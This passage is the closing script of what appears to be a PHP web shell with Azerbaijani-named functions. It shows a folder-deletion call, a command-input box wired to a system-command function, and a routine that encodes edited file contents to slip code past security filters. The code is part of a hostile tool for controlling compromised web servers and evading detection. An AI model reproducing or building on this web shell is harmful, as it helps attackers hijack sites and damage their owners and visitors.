        sehife("?ne=papka_sil&qovluq=<?=urlencode(urlencode(shifrele($default_dir)))?>&zf=" + qovluq)
    }
}
function shifrelee()
{
    var vall = document.getElementsByClassName('file_edit')[0].value;
    var repp = ['a','i','e','s','l','b','u','o','p','h',"\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$"];
    for(var s in repp)
    {
        var h = repp[s];
        vall = vall.replace(new RegExp(h, 'g') , '|:'+s+':|');
    }

    document.getElementsByClassName('file_edit')[0].value = vall;
}

document.getElementById("emr_et_atash").addEventListener("keyup", function(event)
{
    event.preventDefault();
    if (event.keyCode === 13)
    {
        sistemKom();
    }
});
</script>
</body>
</html>